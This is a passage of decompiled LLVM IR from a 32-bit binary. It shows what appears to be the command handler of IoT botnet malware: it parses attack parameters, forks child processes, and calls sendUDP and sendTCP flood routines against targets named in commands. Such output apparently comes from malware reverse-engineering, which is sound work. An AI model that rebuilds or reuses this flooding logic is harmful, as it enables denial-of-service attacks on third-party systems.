  store i1 %v5_804e0b3, i1* %cf.global-to-local, align 1
  store i32 %v0_804e0ae, i32* %stack_var_-476, align 4
  %v2_804e0bc = call i32 @sockprintf(i32 %v0_804e0ae, i32 ptrtoint ([113 x i8]* @global_var_805f430.659 to i32))
  %v0_804e0c1 = load i32, i32* @esp, align 4
  %v2_804e0c1 = icmp ugt i32 %v0_804e0c1, -17
  store i1 %v2_804e0c1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804e0c9:                             ; preds = %dec_label_pc_804e096, %dec_label_pc_804e090
  %v1_804e0cc = add i32 %tmp226, 4
  %v1_804e0cf = inttoptr i32 %v1_804e0cc to i32*
  %v2_804e0cf = load i32, i32* %v1_804e0cf, align 4
  %v2_804e0da = load i32, i32* %v1_804dff4, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e0da, i32* %stack_var_-476, align 4
  %v1_804e0e0 = call i32 @atol(i32 %v2_804e0da)
  %v2_804e0f1 = load i32, i32* %v1_804dfd7, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e0f1, i32* %stack_var_-476, align 4
  %v1_804e0f7 = call i32 @atol(i32 %v2_804e0f1)
  %v2_804e108 = load i32, i32* %v1_804e011, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e108, i32* %stack_var_-476, align 4
  %v1_804e10e = call i32 @atol(i32 %v2_804e108)
  %v2_804e11f = load i32, i32* %v1_804e02e, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e11f, i32* %stack_var_-476, align 4
  %v1_804e125 = call i32 @atol(i32 %v2_804e11f)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e134 = icmp sgt i32 %tmp170, 6
  br i1 %v7_804e134, label %dec_label_pc_804e15c, label %dec_label_pc_804e15c.thread

dec_label_pc_804e15c.thread:                      ; preds = %dec_label_pc_804e0c9
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804e090, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e191.thread

dec_label_pc_804e15c:                             ; preds = %dec_label_pc_804e0c9
  %v1_804e139 = add i32 %tmp226, 24
  %v1_804e13c = inttoptr i32 %v1_804e139 to i32*
  %v2_804e13c = load i32, i32* %v1_804e13c, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e13c, i32* %stack_var_-476, align 4
  %v1_804e142 = call i32 @atol(i32 %v2_804e13c)
  store i32 %v1_804e142, i32* @esi, align 4
  store i1 %v8_804e090, i1* %cf.global-to-local, align 1
  br i1 %v12_804e090, label %dec_label_pc_804e191.thread, label %dec_label_pc_804e191

dec_label_pc_804e191.thread:                      ; preds = %dec_label_pc_804e15c, %dec_label_pc_804e15c.thread
  %storemerge55253.ph = phi i32 [ 1000, %dec_label_pc_804e15c.thread ], [ %v1_804e142, %dec_label_pc_804e15c ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e1c6

dec_label_pc_804e191:                             ; preds = %dec_label_pc_804e15c
  %v1_804e16e = add i32 %tmp226, 28
  %v1_804e171 = inttoptr i32 %v1_804e16e to i32*
  %v2_804e171 = load i32, i32* %v1_804e171, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e171, i32* %stack_var_-476, align 4
  %v1_804e177 = call i32 @atol(i32 %v2_804e171)
  store i32 %v1_804e177, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e19e = icmp sgt i32 %tmp170, 8
  br i1 %v7_804e19e, label %dec_label_pc_804e1a0, label %dec_label_pc_804e1c6

dec_label_pc_804e1a0:                             ; preds = %dec_label_pc_804e191
  %v1_804e1a3 = add i32 %tmp226, 32
  %v1_804e1a6 = inttoptr i32 %v1_804e1a3 to i32*
  %v2_804e1a6 = load i32, i32* %v1_804e1a6, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e1a6, i32* %stack_var_-476, align 4
  %v1_804e1ac = call i32 @atol(i32 %v2_804e1a6)
  %v0_804e1b1 = load i32, i32* @esp, align 4
  %v2_804e1b1 = icmp ugt i32 %v0_804e1b1, -17
  store i1 %v2_804e1b1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %dec_label_pc_804e191.thread, %dec_label_pc_804e191, %dec_label_pc_804e1a0
  %storemerge54258 = phi i32 [ %v1_804e177, %dec_label_pc_804e1a0 ], [ %v1_804e177, %dec_label_pc_804e191 ], [ 1000000, %dec_label_pc_804e191.thread ]
  %storemerge55253257 = phi i32 [ %v1_804e142, %dec_label_pc_804e1a0 ], [ %v1_804e142, %dec_label_pc_804e191 ], [ %storemerge55253.ph, %dec_label_pc_804e191.thread ]
  %storemerge53 = phi i32 [ %v1_804e1ac, %dec_label_pc_804e1a0 ], [ 0, %dec_label_pc_804e191 ], [ 0, %dec_label_pc_804e191.thread ]
  %v5_804e1d2 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e1d2, i1* %cf.global-to-local, align 1
  store i32 %v2_804e0cf, i32* %stack_var_-476, align 4
  %v2_804e1d8 = inttoptr i32 %v2_804e0cf to i8*
  %v3_804e1d8 = call i32 @__GI_strchr(i8* %v2_804e1d8, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e1e0 = icmp eq i32 %v3_804e1d8, 0
  br i1 %v1_804e1e0, label %dec_label_pc_804e250, label %dec_label_pc_804e1e4

dec_label_pc_804e1e4:                             ; preds = %dec_label_pc_804e1c6
  store i32 %v2_804e0cf, i32* @eax, align 4
  store i1 %v5_804e1d2, i1* %cf.global-to-local, align 1
  store i32 %v2_804e0cf, i32* %stack_var_-476, align 4
  %v2_804e1f0 = call i32 @__GI_strtok(i32 %v2_804e0cf, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e245280 = icmp eq i32 %v2_804e1f0, 0
  %v1_804e249281 = icmp eq i1 %v4_804e245280, false
  br i1 %v1_804e249281, label %dec_label_pc_804e1fd, label %dec_label_pc_804eb69

dec_label_pc_804e1fd:                             ; preds = %dec_label_pc_804e1e4, %dec_label_pc_804e230
  %storemerge113282 = phi i32 [ %v2_804e23a, %dec_label_pc_804e230 ], [ %v2_804e1f0, %dec_label_pc_804e1e4 ]
  %v0_804e1fd = call i32 @listFork()
  store i32 %v0_804e1fd, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e202 = icmp eq i32 %v0_804e1fd, 0
  %v1_804e204 = icmp eq i1 %v1_804e202, false
  br i1 %v1_804e204, label %dec_label_pc_804e230, label %dec_label_pc_804e206

dec_label_pc_804e206:                             ; preds = %dec_label_pc_804e1fd
  store i32 %v1_804e125, i32* %stack_var_-476, align 4
  %v8_804e21e = call i32 @sendUDP(i32 %storemerge113282, i32 %v1_804e0e0, i32 %v1_804e0f7, i32 %v1_804e10e, i32 %v1_804e125, i32 %storemerge55253257, i32 %storemerge54258, i32 %storemerge53)
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e22b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e230:                             ; preds = %dec_label_pc_804e1fd
  %v0_804e230 = load i32, i32* @esp, align 4
  %v5_804e230 = icmp ult i32 %v0_804e230, 8
  store i1 %v5_804e230, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v2_804e23a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e245 = icmp eq i32 %v2_804e23a, 0
  %v1_804e249 = icmp eq i1 %v4_804e245, false
  br i1 %v1_804e249, label %dec_label_pc_804e1fd, label %dec_label_pc_804eb69

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e1c6
  %v0_804e250 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e255 = icmp eq i32 %v0_804e250, 0
  %v1_804e257 = icmp eq i1 %v1_804e255, false
  br i1 %v1_804e257, label %dec_label_pc_804eb69, label %dec_label_pc_804e25d

dec_label_pc_804e25d:                             ; preds = %dec_label_pc_804e250
  store i32 %v1_804e125, i32* %stack_var_-476, align 4
  %v8_804e275 = call i32 @sendUDP(i32 %v2_804e0cf, i32 %v1_804e0e0, i32 %v1_804e0f7, i32 %v1_804e10e, i32 %v1_804e125, i32 %storemerge55253257, i32 %storemerge54258, i32 %storemerge53)
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e282 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e287:                             ; preds = %dec_label_pc_804df7c
  %v2_804e28a = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e2a7 = inttoptr i32 %v2_804e28a to i8*
  store i32 %v2_804e28a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f4a1.660 to i32), i32* @edi, align 4
  %v7_804e2b9 = call i32 @_strncmp(i8* %v4_804e2a7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f4a1.660, i32 0, i32 0), i32 4)
  %v8_804e2b9 = urem i32 %v7_804e2b9, 2
  %v9_804e2b9 = icmp eq i32 %v8_804e2b9, 0
  %v0_804e2bb = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2bb = or i1 %v0_804e2bb, %v9_804e2b9
  %v3_804e2bb = zext i1 %v2_804e2bb to i32
  %v4_804e2bb = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2bb = and i32 %v4_804e2bb, -256
  %v6_804e2bb = or i32 %v3_804e2bb, %v5_804e2bb
  %v7_804e2bb = xor i32 %v6_804e2bb, 1
  store i32 %v7_804e2bb, i32* @edx, align 4
  %v1_804e2c3 = trunc i32 %v7_804e2bb to i8
  %v3_804e2c3 = zext i1 %v0_804e2bb to i8
  %v15_804e2c3 = icmp eq i8 %v1_804e2c3, %v3_804e2c3
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e2cc = icmp eq i1 %v15_804e2c3, false
  br i1 %v1_804e2cc, label %dec_label_pc_804e511, label %dec_label_pc_804e2d2

dec_label_pc_804e2d2:                             ; preds = %dec_label_pc_804e287
  %v9_804e2d2 = icmp ult i32 %tmp170, 5
  store i1 %v9_804e2d2, i1* %cf.global-to-local, align 1
  %v7_804e2d6 = icmp sgt i32 %tmp170, 5
  br i1 %v7_804e2d6, label %dec_label_pc_804e2dc, label %dec_label_pc_804e2d2.dec_label_pc_804e380_crit_edge

dec_label_pc_804e2d2.dec_label_pc_804e380_crit_edge: ; preds = %dec_label_pc_804e2d2
  %v0_804e385.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e380

dec_label_pc_804e2dc:                             ; preds = %dec_label_pc_804e2d2
  %v1_804e2df = add i32 %tmp226, 12
  %v1_804e2e2 = inttoptr i32 %v1_804e2df to i32*
  %v2_804e2e2 = load i32, i32* %v1_804e2e2, align 4
  %v0_804e2e4 = load i32, i32* @esp, align 4
  %v5_804e2e4 = icmp ult i32 %v0_804e2e4, 12
  store i1 %v5_804e2e4, i1* %cf.global-to-local, align 1
  store i32 %v2_804e2e2, i32* %stack_var_-476, align 4
  %v1_804e2e8 = call i32 @atol(i32 %v2_804e2e2)
  %v5_804e2f0 = icmp ne i32 %v1_804e2e8, -1
  store i1 %v5_804e2f0, i1* %cf.global-to-local, align 1
  %v10_804e2f0 = icmp eq i32 %v1_804e2e8, -1
  br i1 %v10_804e2f0, label %dec_label_pc_804e380, label %dec_label_pc_804e2f9

dec_label_pc_804e2f9:                             ; preds = %dec_label_pc_804e2dc
  %v1_804e2fc = add i32 %tmp226, 8
  %v1_804e2ff = inttoptr i32 %v1_804e2fc to i32*
  %v2_804e2ff = load i32, i32* %v1_804e2ff, align 4
  %v5_804e301 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e2ff, i32* %stack_var_-476, align 4
  %v1_804e305 = call i32 @atol(i32 %v2_804e2ff)
  %v5_804e30d = icmp ne i32 %v1_804e305, -1
  store i1 %v5_804e30d, i1* %cf.global-to-local, align 1
  %v10_804e30d = icmp eq i32 %v1_804e305, -1
  br i1 %v10_804e30d, label %dec_label_pc_804e380, label %dec_label_pc_804e312

dec_label_pc_804e312:                             ; preds = %dec_label_pc_804e2f9
  %v1_804e315 = add i32 %tmp226, 16
  %v1_804e318 = inttoptr i32 %v1_804e315 to i32*
  %v2_804e318 = load i32, i32* %v1_804e318, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e318, i32* %stack_var_-476, align 4
  %v1_804e31e = call i32 @atol(i32 %v2_804e318)
  %v5_804e326 = icmp ne i32 %v1_804e31e, -1
  store i1 %v5_804e326, i1* %cf.global-to-local, align 1
  %v10_804e326 = icmp eq i32 %v1_804e31e, -1
  br i1 %v10_804e326, label %dec_label_pc_804e380, label %dec_label_pc_804e32b

dec_label_pc_804e32b:                             ; preds = %dec_label_pc_804e312
  %v2_804e331 = load i32, i32* %v1_804e318, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e331, i32* %stack_var_-476, align 4
  %v1_804e337 = call i32 @atol(i32 %v2_804e331)
  %v1_804e33f = add i32 %v1_804e337, -32
  %v2_804e33f = icmp ult i32 %v1_804e337, 32
  %v3_804e33f = sub i32 31, %v1_804e337
  %v4_804e33f = and i32 %v3_804e33f, %v1_804e337
  %v5_804e33f = icmp slt i32 %v4_804e33f, 0
  store i1 %v2_804e33f, i1* %cf.global-to-local, align 1
  %v6_804e33f = icmp eq i32 %v1_804e33f, 0
  %v7_804e33f = icmp slt i32 %v1_804e33f, 0
  %v3_804e342 = icmp eq i1 %v7_804e33f, %v5_804e33f
  %v4_804e342 = icmp eq i1 %v6_804e33f, false
  %v5_804e342 = and i1 %v4_804e342, %v3_804e342
  br i1 %v5_804e342, label %dec_label_pc_804e380, label %dec_label_pc_804e344

dec_label_pc_804e344:                             ; preds = %dec_label_pc_804e32b
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e348 = icmp sgt i32 %tmp170, 6
  br i1 %v7_804e348, label %dec_label_pc_804e34a, label %dec_label_pc_804e362.thread

dec_label_pc_804e362.thread:                      ; preds = %dec_label_pc_804e344
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e39b

dec_label_pc_804e34a:                             ; preds = %dec_label_pc_804e344
  %v1_804e34d = add i32 %tmp226, 24
  %v1_804e350 = inttoptr i32 %v1_804e34d to i32*
  %v2_804e350 = load i32, i32* %v1_804e350, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e350, i32* %stack_var_-476, align 4
  %v1_804e356 = call i32 @atol(i32 %v2_804e350)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e35e = icmp slt i32 %v1_804e356, 0
  br i1 %v2_804e35e, label %dec_label_pc_804e380, label %dec_label_pc_804e362

dec_label_pc_804e362:                             ; preds = %dec_label_pc_804e34a
  %v8_804e362 = icmp ult i32 %tmp170, 8
  store i1 %v8_804e362, i1* %cf.global-to-local, align 1
  %v12_804e362 = icmp eq i32 %tmp170, 8
  %v1_804e366 = icmp eq i1 %v12_804e362, false
  br i1 %v1_804e366, label %dec_label_pc_804e39b, label %dec_label_pc_804e368

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e362
  %v1_804e36b = add i32 %tmp226, 28
  %v1_804e36e = inttoptr i32 %v1_804e36b to i32*
  %v2_804e36e = load i32, i32* %v1_804e36e, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e36e, i32* %stack_var_-476, align 4
  %v1_804e374 = call i32 @atol(i32 %v2_804e36e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp243 = icmp slt i32 %v1_804e374, 1
  %tmp244 = icmp eq i1 %tmp243, false
  br i1 %tmp244, label %dec_label_pc_804e39b, label %dec_label_pc_804e380

dec_label_pc_804e380:                             ; preds = %dec_label_pc_804e2d2.dec_label_pc_804e380_crit_edge, %dec_label_pc_804e368, %dec_label_pc_804e34a, %dec_label_pc_804e32b, %dec_label_pc_804e312, %dec_label_pc_804e2f9, %dec_label_pc_804e2dc
  %v0_804e385 = phi i32 [ %v0_804e385.pre, %dec_label_pc_804e2d2.dec_label_pc_804e380_crit_edge ], [ %v15_804d7b9, %dec_label_pc_804e368 ], [ %v15_804d7b9, %dec_label_pc_804e34a ], [ %v15_804d7b9, %dec_label_pc_804e32b ], [ %v15_804d7b9, %dec_label_pc_804e312 ], [ %v15_804d7b9, %dec_label_pc_804e2f9 ], [ %v15_804d7b9, %dec_label_pc_804e2dc ]
  %v0_804e380 = load i32, i32* @global_var_8061580.20, align 128
  %v5_804e385 = icmp ult i32 %v0_804e385, 8
  store i1 %v5_804e385, i1* %cf.global-to-local, align 1
  store i32 %v0_804e380, i32* %stack_var_-476, align 4
  %v2_804e38e = call i32 @sockprintf(i32 %v0_804e380, i32 ptrtoint ([186 x i8]* @global_var_805f4a8.661 to i32))
  %v0_804e393 = load i32, i32* @esp, align 4
  %v2_804e393 = icmp ugt i32 %v0_804e393, -17
  store i1 %v2_804e393, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804e39b:                             ; preds = %dec_label_pc_804e362.thread, %dec_label_pc_804e368, %dec_label_pc_804e362
  %v8_804e362262 = phi i1 [ true, %dec_label_pc_804e362.thread ], [ %v8_804e362, %dec_label_pc_804e368 ], [ %v8_804e362, %dec_label_pc_804e362 ]
  %v1_804e366264 = phi i1 [ true, %dec_label_pc_804e362.thread ], [ false, %dec_label_pc_804e368 ], [ true, %dec_label_pc_804e362 ]
  %v1_804e39e = add i32 %tmp226, 4
  %v1_804e3a1 = inttoptr i32 %v1_804e39e to i32*
  %v2_804e3a1 = load i32, i32* %v1_804e3a1, align 4
  %v2_804e3ac = load i32, i32* %v1_804e2ff, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3ac, i32* %stack_var_-476, align 4
  %v1_804e3b2 = call i32 @atol(i32 %v2_804e3ac)
  %v2_804e3c3 = load i32, i32* %v1_804e2e2, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3c3, i32* %stack_var_-476, align 4
  %v1_804e3c9 = call i32 @atol(i32 %v2_804e3c3)
  %v2_804e3da = load i32, i32* %v1_804e318, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3da, i32* %stack_var_-476, align 4
  %v1_804e3e0 = call i32 @atol(i32 %v2_804e3da)
  %v1_804e3ee = add i32 %tmp226, 20
  %v1_804e3f1 = inttoptr i32 %v1_804e3ee to i32*
  %v2_804e3f1 = load i32, i32* %v1_804e3f1, align 4
  store i1 %v8_804e362262, i1* %cf.global-to-local, align 1
  br i1 %v1_804e366264, label %dec_label_pc_804e422, label %dec_label_pc_804e3fc

dec_label_pc_804e3fc:                             ; preds = %dec_label_pc_804e39b
  %v1_804e3ff = add i32 %tmp226, 28
  %v1_804e402 = inttoptr i32 %v1_804e3ff to i32*
  %v2_804e402 = load i32, i32* %v1_804e402, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e402, i32* %stack_var_-476, align 4
  %v1_804e408 = call i32 @atol(i32 %v2_804e402)
  %v0_804e40d = load i32, i32* @esp, align 4
  %v2_804e40d = icmp ugt i32 %v0_804e40d, -17
  store i1 %v2_804e40d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e422

dec_label_pc_804e422:                             ; preds = %dec_label_pc_804e39b, %dec_label_pc_804e3fc
  %storemerge52 = phi i32 [ %v1_804e408, %dec_label_pc_804e3fc ], [ 10, %dec_label_pc_804e39b ]
  store i32 %storemerge52, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804e348, label %dec_label_pc_804e431, label %dec_label_pc_804e457

dec_label_pc_804e431:                             ; preds = %dec_label_pc_804e422
  %v1_804e434 = add i32 %tmp226, 24
  %v1_804e437 = inttoptr i32 %v1_804e434 to i32*
  %v2_804e437 = load i32, i32* %v1_804e437, align 4
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 %v2_804e437, i32* %stack_var_-476, align 4
  %v1_804e43d = call i32 @atol(i32 %v2_804e437)
  %v0_804e442 = load i32, i32* @esp, align 4
  %v2_804e442 = icmp ugt i32 %v0_804e442, -17
  store i1 %v2_804e442, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e457

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e422, %dec_label_pc_804e431
  %storemerge51 = phi i32 [ %v1_804e43d, %dec_label_pc_804e431 ], [ 0, %dec_label_pc_804e422 ]
  store i32 %storemerge51, i32* @edi, align 4
  %v5_804e463 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e463, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3a1, i32* %stack_var_-476, align 4
  %v2_804e469 = inttoptr i32 %v2_804e3a1 to i8*
  %v3_804e469 = call i32 @__GI_strchr(i8* %v2_804e469, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e471 = icmp eq i32 %v3_804e469, 0
  br i1 %v1_804e471, label %dec_label_pc_804e4de, label %dec_label_pc_804e475

dec_label_pc_804e475:                             ; preds = %dec_label_pc_804e457
  store i32 %v2_804e3a1, i32* @eax, align 4
  store i1 %v5_804e463, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3a1, i32* %stack_var_-476, align 4
  %v2_804e481 = call i32 @__GI_strtok(i32 %v2_804e3a1, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e4d6277 = icmp eq i32 %v2_804e481, 0
  %v1_804e4da278 = icmp eq i1 %v4_804e4d6277, false
  br i1 %v1_804e4da278, label %dec_label_pc_804e48e, label %dec_label_pc_804e511

dec_label_pc_804e48e:                             ; preds = %dec_label_pc_804e475, %dec_label_pc_804e4c1
  %storemerge114279 = phi i32 [ %v2_804e4cb, %dec_label_pc_804e4c1 ], [ %v2_804e481, %dec_label_pc_804e475 ]
  %v0_804e48e = call i32 @listFork()
  store i32 %v0_804e48e, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e493 = icmp eq i32 %v0_804e48e, 0
  %v1_804e495 = icmp eq i1 %v1_804e493, false
  %v0_804e4c1 = load i32, i32* @esp, align 4
  br i1 %v1_804e495, label %dec_label_pc_804e4c1, label %dec_label_pc_804e497

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e48e
  %v5_804e497 = icmp ult i32 %v0_804e4c1, 4
  store i1 %v5_804e497, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3f1, i32* %stack_var_-476, align 4
  %v7_804e4af = inttoptr i32 %v2_804e3f1 to i8*
  %v8_804e4af = call i32 @sendTCP(i32 %storemerge114279, i32 %v1_804e3b2, i32 %v1_804e3c9, i32 %v1_804e3e0, i8* %v7_804e4af, i32 %storemerge51, i32 %storemerge52)
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e4bc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e4c1:                             ; preds = %dec_label_pc_804e48e
  %v5_804e4c1 = icmp ult i32 %v0_804e4c1, 8
  store i1 %v5_804e4c1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v2_804e4cb = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e4d6 = icmp eq i32 %v2_804e4cb, 0
  %v1_804e4da = icmp eq i1 %v4_804e4d6, false
  br i1 %v1_804e4da, label %dec_label_pc_804e48e, label %dec_label_pc_804e511

dec_label_pc_804e4de:                             ; preds = %dec_label_pc_804e457
  %v0_804e4de = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e4e3 = icmp eq i32 %v0_804e4de, 0
  %v1_804e4e5 = icmp eq i1 %v1_804e4e3, false
  br i1 %v1_804e4e5, label %dec_label_pc_804e511, label %dec_label_pc_804e4e7

dec_label_pc_804e4e7:                             ; preds = %dec_label_pc_804e4de
  %v0_804e4e7 = load i32, i32* @esp, align 4
  %v5_804e4e7 = icmp ult i32 %v0_804e4e7, 4
  store i1 %v5_804e4e7, i1* %cf.global-to-local, align 1
  store i32 %v2_804e3f1, i32* %stack_var_-476, align 4
  %v7_804e4ff = inttoptr i32 %v2_804e3f1 to i8*
  %v8_804e4ff = call i32 @sendTCP(i32 %v2_804e3a1, i32 %v1_804e3b2, i32 %v1_804e3c9, i32 %v1_804e3e0, i8* %v7_804e4ff, i32 %storemerge51, i32 %storemerge52)
  store i1 %v5_804e301, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e50c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e511:                             ; preds = %dec_label_pc_804e475, %dec_label_pc_804e4c1, %dec_label_pc_804e4de, %dec_label_pc_804e287
  %v2_804e514 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e531 = inttoptr i32 %v2_804e514 to i8*
  store i32 %v2_804e514, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805f562.662 to i32), i32* @edi, align 4
  %v7_804e543 = call i32 @_strncmp(i8* %v4_804e531, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805f562.662, i32 0, i32 0), i32 5)
  %v8_804e543 = urem i32 %v7_804e543, 2
  %v9_804e543 = icmp eq i32 %v8_804e543, 0
  %v0_804e545 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e545 = or i1 %v0_804e545, %v9_804e543
  %v3_804e545 = zext i1 %v2_804e545 to i32
  %v4_804e545 = load i32, i32* @edx, align 4
  %v5_804e545 = and i32 %v4_804e545, -256
  %v6_804e545 = or i32 %v3_804e545, %v5_804e545
  %v7_804e545 = xor i32 %v6_804e545, 1
  store i32 %v7_804e545, i32* @edx, align 4
  %v3_804e54b = and i32 %v7_804e543, -256
  %v1_804e54d = trunc i32 %v7_804e545 to i8
  %v3_804e54d = zext i1 %v0_804e545 to i8
  %v4_804e54d = sub nsw i8 %v1_804e54d, %v3_804e54d
  %v15_804e54d = icmp eq i8 %v4_804e54d, 0
  %v20_804e54d = zext i8 %v4_804e54d to i32
  %v23_804e54d = or i32 %v20_804e54d, %v3_804e54b
  store i32 %v23_804e54d, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e556 = icmp eq i1 %v15_804e54d, false
  br i1 %v1_804e556, label %dec_label_pc_804e6dd, label %dec_label_pc_804e55c

dec_label_pc_804e55c:                             ; preds = %dec_label_pc_804e511
  %v2_804e551 = sext i8 %v4_804e54d to i32
  %v9_804e55c = icmp ult i32 %tmp170, 5
  store i1 %v9_804e55c, i1* %cf.global-to-local, align 1
  %v7_804e560 = icmp sgt i32 %tmp170, 5
  br i1 %v7_804e560, label %dec_label_pc_804e566, label %dec_label_pc_804eb69

dec_label_pc_804e566:                             ; preds = %dec_label_pc_804e55c
  %v1_804e569 = add i32 %tmp226, 4
  %v1_804e56c = inttoptr i32 %v1_804e569 to i32*
  %v2_804e56c = load i32, i32* %v1_804e56c, align 4
  %v0_804e56e = load i32, i32* @esp, align 4
  %v5_804e56e = icmp ult i32 %v0_804e56e, 8
  store i1 %v5_804e56e, i1* %cf.global-to-local, align 1
  store i32 %v2_804e56c, i32* %stack_var_-476, align 4
  %v2_804e574 = inttoptr i32 %v2_804e56c to i8*
  %v3_804e574 = call i32 @__GI_strchr(i8* %v2_804e574, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e57c = icmp eq i32 %v3_804e574, 0
  br i1 %v1_804e57c, label %dec_label_pc_804e651, label %dec_label_pc_804e584

dec_label_pc_804e584:                             ; preds = %dec_label_pc_804e566
  %v2_804e58a = load i32, i32* %v1_804e56c, align 4
  store i32 %v2_804e58a, i32* @eax, align 4
  %v5_804e58c = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e58c, i1* %cf.global-to-local, align 1
  store i32 %v2_804e58a, i32* %stack_var_-476, align 4
  %v2_804e595 = call i32 @__GI_strtok(i32 %v2_804e58a, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e642275 = icmp eq i32 %v2_804e595, 0
  %v1_804e646276 = icmp eq i1 %v4_804e642275, false
  br i1 %v1_804e646276, label %dec_label_pc_804e5a5, label %dec_label_pc_804e6dd

dec_label_pc_804e5a5:                             ; preds = %dec_label_pc_804e584, %dec_label_pc_804e62d
  %v0_804e5a5 = call i32 @listFork()
  store i32 %v0_804e5a5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e5aa = icmp eq i32 %v0_804e5a5, 0
  %v1_804e5ac = icmp eq i1 %v1_804e5aa, false
  br i1 %v1_804e5ac, label %dec_label_pc_804e62d, label %dec_label_pc_804e5ae

